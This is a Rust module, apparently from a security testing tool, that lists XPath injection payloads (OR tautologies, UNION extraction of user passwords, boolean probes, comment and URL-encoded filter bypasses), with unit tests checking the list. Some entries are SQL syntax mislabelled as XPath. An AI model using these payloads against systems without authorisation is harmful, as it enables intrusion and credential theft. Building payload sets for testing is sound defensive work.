use super::{Payload, PayloadType, Severity};

pub fn get_payloads() -> Vec<Payload> {
    let mut payloads = payload_vec!(PayloadType::Xpath,
        "basic-injection", [
            ("' or '1'='1", "Classic OR injection", Severity::Critical),
            ("' or ''='", "Empty string OR", Severity::Critical),
            ("' or 1=1--", "Numeric OR injection", Severity::Critical),
            ("' OR '1'='1'/*", "OR with block comment", Severity::Critical),
            ("\" or \"1\"=\"1", "Double quote OR", Severity::Critical),
            ("' or 'a'='a", "Letter OR injection", Severity::Critical),
            ("' or 1=1 or 'x'='y", "Extended OR injection", Severity::Critical),
        ];
        "union-based", [
            ("' union select 1--", "UNION single column", Severity::Critical),
            ("' union select 1,2--", "UNION two columns", Severity::Critical),
            ("' union select 1,2,3--", "UNION three columns", Severity::Critical),
            ("' union select name,password from users--", "UNION data extraction", Severity::Critical),
            ("' and 1=1 union select 'a','b','c'--", "UNION with AND", Severity::Critical),
        ];
        "boolean-based", [
            ("' and 1=1--", "AND true condition", Severity::High),
            ("' and 1=2--", "AND false condition", Severity::High),
            ("' and 'a'='a'--", "AND string true", Severity::High),
            ("' and 'a'='b'--", "AND string false", Severity::High),
            ("' or 1=1 and 'a'='a", "OR with AND true", Severity::High),
            ("' or 1=2 and 'a'='b", "OR with AND false", Severity::High),
        ];
        "error-based", [
            ("' or count(*)>0--", "COUNT error injection", Severity::High),
            ("' or string-length('a')>0--", "String-length error", Severity::High),
            ("' or substring('abcd',1,1)='a'--", "Substring boolean test", Severity::High),
        ];
        "comment-based", [
            ("'--", "Double dash comment", Severity::Critical),
            ("'/*", "Block comment start", Severity::Critical),
            ("' or '1'='1'--", "OR with double dash", Severity::Critical),
            ("' or '1'='1'/*", "OR with block comment", Severity::Critical),
            ("' or '1'='1'#", "OR with hash comment", Severity::Critical),
        ];
        "functions", [
            ("string-length('test')", "XPath string-length function", Severity::High),
            ("substring('test',1,1)", "XPath substring function", Severity::High),
            ("contains('test','es')", "XPath contains function", Severity::High),
            ("starts-with('test','te')", "XPath starts-with function", Severity::High),
            ("concat('a','b')", "XPath concat function", Severity::High),
            ("name(parent::node())", "XPath parent axis", Severity::High),
            ("count(node())", "XPath count function", Severity::High),
        ];
        "bypass", [
            ("' or 1=1 or ''='", "Double OR bypass", Severity::High),
            ("'/**/or/**/1=1--", "Comment whitespace bypass", Severity::High),
            ("'%0aor%0a'1'='1", "Newline bypass", Severity::High),
            ("' oR '1'='1", "Case variation OR", Severity::High),
            ("'%27%20or%20%271%27%3D%271", "URL encoded OR", Severity::High),
        ];
    );

    for p in &mut payloads {
        if p.tags.contains(&"basic-injection".to_string()) && !p.tags.contains(&"classic".to_string()) {
            p.tags.push("classic".to_string());
        }
        if p.tags.contains(&"union-based".to_string()) {
            p.tags.push("extraction".to_string());
        }
    }

    payloads
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn payloads_non_empty() {
        let payloads = get_payloads();
        assert!(!payloads.is_empty(), "XPath payloads must not be empty");
    }

    #[test]
    fn all_payloads_are_xpath_type() {
        for p in get_payloads() {
            assert_eq!(p.payload_type, PayloadType::Xpath);
        }
    }

    #[test]
    fn contains_or_injection() {
        let payloads = get_payloads();
        let has_or = payloads
            .iter()
            .any(|p| p.payload.contains(" or ") || p.payload.contains(" OR "));
        assert!(has_or, "Must contain OR-based XPath injection");
    }

    #[test]
    fn contains_union_select() {
        let payloads = get_payloads();
        let has_union = payloads
            .iter()
            .any(|p| p.payload.to_uppercase().contains("UNION SELECT"));
        assert!(has_union, "Must contain UNION SELECT payloads");
    }

    #[test]
    fn contains_xpath_functions() {
        let payloads = get_payloads();
        let has_funcs = payloads.iter().any(|p| {
            p.payload.contains("string-length")
                || p.payload.contains("substring")
                || p.payload.contains("contains")
        });
        assert!(has_funcs, "Must contain XPath function payloads");
    }

    #[test]
    fn contains_comment_bypass() {
        let payloads = get_payloads();
        let has_comments = payloads.iter().any(|p| {
            p.payload.contains("--") || p.payload.contains("/*") || p.payload.contains("#")
        });
        assert!(has_comments, "Must contain SQL comment bypass payloads");
    }

    #[test]
    fn minimum_payload_count() {
        let payloads = get_payloads();
        assert!(
            payloads.len() >= 30,
            "Must have substantial XPath payload coverage, got {}",
            payloads.len()
        );
    }
}
